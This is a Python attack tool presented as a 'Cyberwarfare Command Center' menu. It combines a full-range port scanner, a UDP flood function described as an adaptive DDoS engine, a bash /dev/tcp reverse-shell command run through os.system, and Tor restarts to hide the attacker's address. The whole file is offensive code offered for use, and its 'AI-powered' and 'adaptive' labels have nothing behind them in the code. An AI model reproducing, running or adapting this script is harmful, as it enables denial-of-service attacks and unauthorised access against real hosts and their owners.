import socket
import threading
import random
import os
import time
import requests
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor

# AI-Powered Vulnerability Scanner
def scan_target(target_ip):
    print(f"[+] Scanning {target_ip} for vulnerabilities...")
    for port in range(1, 65536):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target_ip, port)) == 0:
                print(f"[OPEN] Port {port} is open on {target_ip}")
            sock.close()
        except:
            pass

# Adaptive DDoS Engine
def adaptive_ddos(target_ip, target_port, attack_duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + attack_duration
    while time.time() < timeout:
        packet = random._urandom(65507)
        sock.sendto(packet, (target_ip, target_port))

# Payload Injection (Example: Reverse Shell)
def payload_injection(target_ip, target_port):
    payload = "bash -i >& /dev/tcp/" + target_ip + f"/{target_port} 0>&1"
    print(f"Injecting payload: {payload}")
    os.system(payload)

# Stealth Mode: Dynamic IP Cycling
def dynamic_ip_cycle():
    os.system("service tor restart")
    print("[+] IP Changed Successfully")

# Live Command & Control Interface
def command_lobby():
    print("\nCyberwarfare Command Center")
    print("1. Scan Target for Vulnerabilities")
    print("2. Launch Adaptive DDoS Attack")
    print("3. Inject Payload")
    print("4. Change IP Address")
    print("5. Exit")
    
    while True:
        choice = input("Select an operation: ")
        if choice == "1":
            target_ip = input("Target IP: ")
            threading.Thread(target=scan_target, args=(target_ip,)).start()
        elif choice == "2":
            target_ip = input("Target IP: ")
            target_port = int(input("Target Port: "))
            duration = int(input("Attack Duration (seconds): "))
            threading.Thread(target=adaptive_ddos, args=(target_ip, target_port, duration)).start()
        elif choice == "3":
            target_ip = input("Target IP: ")
            target_port = int(input("Target Port: "))
            threading.Thread(target=payload_injection, args=(target_ip, target_port)).start()
        elif choice == "4":
            threading.Thread(target=dynamic_ip_cycle).start()
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    command_lobby()
